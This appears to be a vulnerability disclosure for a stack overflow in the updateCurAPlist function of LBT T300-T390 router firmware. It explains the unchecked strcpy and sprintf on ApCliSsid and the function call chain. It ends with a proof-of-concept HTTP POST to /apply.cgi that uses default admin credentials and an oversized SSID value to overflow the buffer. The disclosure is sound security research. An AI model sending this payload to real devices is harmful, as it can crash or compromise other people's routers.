# LBT router updateCurAPlist function stack overflow vulnerability

> vendor:LBT
>
> product:T300-T390
>
> version:v2.2.1.8
>
> type:Stack Overflow

## Vulnerability Description

LBT T300-T390 were discovered to contain a stack overflow via the ApCliSsid parameter in the updateCurAPlist function.

## Vulnerability Details

There is a stack overflow in the ApCliSsid variable in the updateCurAPlist function in the Rc program. In line 15, the variable is obtained through the system nvram_get function. In line 18, it is directly called by the dangerous function strcpy without processing. In line 19, v9 after the strcpy function operation is not processed. And passed directly to the dangerous function sprintf, which may overflow the stack-based buffers v8 and v9.

The calling process of the overflow function is as follows:

Main()->sub_40BEC8()->start_lan()->start_wlan()->config_wlan()->generate_conf()->generate_conf_router()->updateCurAPlist()

![image](https://github.com/cvdyfbwa/IoT_LBT_Router/assets/150313831/45b8e878-0813-45fc-980a-8afa96170544)


## POC

    POST /apply.cgi HTTP/1.1
    Host: 192.168.10.1
    Content-Length: 697
    Cache-Control: max-age=0
    Authorization: Basic YWRtaW46YWRtaW4=
    Upgrade-Insecure-Requests: 1
    Origin: http://192.168.10.1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.61
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://192.168.10.1/apclient_scan.asp
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
    Connection: close

    submit_button=apclient_scan&change_action=&wan_proto=9&action=Apply&wan_dns_enable=1&ApCliEnable=1&ApCliBssid=&ApCliChannel=6&ApClientBridgeEnable=1&wr_ApClientBridgeEnable=on&ApCliSsid=Remote_AP_SSID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&ApCliAuthMode=OPEN&ApCliEncrypType=NONE&ApCli_wl_wep_len=0&ApCliDefaultKeyID=1&ApCliKey1Type=0&ApCliKey1Str=**********&ApCliKey2Type=0&ApCliKey2Str=**********&ApCliKey3Type=0&ApCliKey3Str=**********&ApCliKey4Type=0&ApCliKey4Str=**********&ApCliWPAEncrypType=TKIP&ApCliWPAPSK=12345678

   

    
